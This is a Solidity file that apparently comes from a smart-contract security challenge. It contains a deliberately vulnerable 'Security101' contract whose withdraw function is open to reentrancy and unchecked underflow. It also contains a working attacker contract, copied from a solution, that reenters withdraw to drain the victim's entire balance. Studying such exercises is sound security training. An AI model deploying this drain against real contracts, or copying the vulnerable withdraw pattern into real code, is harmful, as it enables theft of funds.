// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.15;

contract Security101 {
    mapping(address => uint256) balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, 'insufficient funds');
        (bool ok, ) = msg.sender.call{value: amount}('');
        require(ok, 'transfer failed');
        unchecked {
            balances[msg.sender] -= amount;
        }
    }
}

// copied from one of the solutions
contract OptimizedAttackerSecurity101 {
    constructor(Security101 _victim) payable {
        Helper helper = new Helper(_victim);
        helper.helperAttack{value: 1}();        // why it doesnt work when I send 1 ether (msg.value)?
        address(helper).call("");               // don't check returned value; gas optimisation
        selfdestruct(payable(msg.sender));
    }
}

contract Helper {
    Security101 victim;
    bool withdrawCounter;
    address attacker;
    constructor(Security101 _victim) {
        victim = _victim;
        attacker = msg.sender;
    }

    function helperAttack() public payable {
        victim.deposit{value: msg.value}();
        victim.withdraw(1);
        
    }
    receive() external payable {
        if(!withdrawCounter ) {
            withdrawCounter = true;
            victim.deposit{value: 1}();
            victim.withdraw(2);// 
        } 

        if(msg.sender == attacker ){
            victim.withdraw(address(victim).balance); 
            selfdestruct(payable(tx.origin));
        }
    }
}